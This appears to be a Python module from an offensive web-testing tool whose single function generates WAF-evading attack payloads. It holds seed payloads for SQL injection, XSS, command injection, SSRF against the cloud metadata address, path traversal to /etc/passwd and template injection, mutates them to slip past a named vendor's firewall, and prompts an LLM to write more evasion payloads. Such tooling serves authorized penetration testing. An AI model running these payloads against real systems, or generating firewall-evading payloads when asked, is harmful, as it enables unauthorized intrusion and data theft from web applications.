"""LLM-assisted & polymorphic WAF-evading payload generator (supports Groq + Ollama + deterministic fallback)."""
from core.llm import get_llm
from core.waf_bypass import generate_waf_variants


def generate_payloads(vuln_class: str, waf_vendor: str = "generic", count: int = 8) -> list[str]:
    seeds = {
        "sqli": "' UNION SELECT NULL,sqlite_version()--",
        "xss": "<svg/onload=alert(1)>",
        "cmdi": ";id",
        "ssrf": "http://169.254.169.254/latest/meta-data/",
        "lfi": "../../../../etc/passwd",
        "ssti": "{{7*7}}",
    }
    base = seeds.get(vuln_class.lower(), seeds["xss"])
    deterministic = [p for _, p in generate_waf_variants(base, vuln_class=vuln_class, vendor=waf_vendor, limit=count)]

    llm = get_llm()
    if not llm.available:
        return deterministic
    try:
        res = llm.complete_json([
            {"role": "system", "content": 'Return JSON {"payloads": [...]} of non-destructive proof-of-concept payloads.'},
            {"role": "user", "content": f"Generate {count} non-destructive {vuln_class} payloads evading {waf_vendor} WAF."},
        ])
        extra = [str(x) for x in (res.get("payloads") or []) if x]
        merged = list(dict.fromkeys(extra + deterministic))
        return merged[:count]
    except Exception:
        return deterministic
